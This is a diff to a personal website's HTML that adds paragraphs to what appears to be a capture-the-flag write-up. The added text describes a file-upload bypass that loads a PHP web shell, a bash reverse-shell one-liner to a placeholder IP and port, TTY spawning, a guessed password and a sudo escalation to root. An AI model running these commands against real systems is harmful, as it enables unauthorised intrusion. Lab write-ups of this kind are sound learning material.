@@ -7,11 +7,11 @@
 		<title>My  Website</title>
 	</head>
 
-	<body >
+	<body>
 
 		<div id="panel-slide-id" class="panel-slide-class">
 			<div id="exit-logo-id" class="exit-logo-class">
-				<a id="exit-about-me-link-id" onclick="closeAboutMe()" href="#">?</a>
+				<a id="exit-about-me-link-id" onclick="closeAboutMe()" href="#">&times;</a>
 			</div>
 
 			<div id="about-me-slide-text-id" class="about-me-slide-text-class">
@@ -47,7 +47,10 @@
 					Thus, I could efectively login as the admin user. After this, there was another stage of enumeration, where I found another vulnerability. It was a File Upload Vulnerability, where you could upload arbituary files and execute it on the webserver. The trick was it checked the integrity of files uploaded throught the upload box, but the website also provided a remote upload path, which you can pass in the URL to a malicious file on your own server (or github) and gain a low privilege shell. So I provided the URL to the php p0wny shell and gained user privilege as www-data. 
 				</p>
 				<p>
-					After this, I became stuck for a while 
+				After this, I became stuck for a while, but realised I needed to get a TTY so I created a reverse shell, using bash -c "bash -i >& /dev/tcp/IP_ADDR/LISTENING_PORT 0>&1" 
+				</p>
+				<p>
+				Privesc for a higher shell was very basic and straightforward, using <br></br>python3 -c "import pty; pty.spawn('/bin/bash')" &&  sudo -i student<br></br> I simply guessed the password to be "student" and it worked! Root privesc was even simpler! The student user was a <b>SUDOER!!</b> So simply do: sudo cat /root/root.txt
 				</p>
 
 			</div>
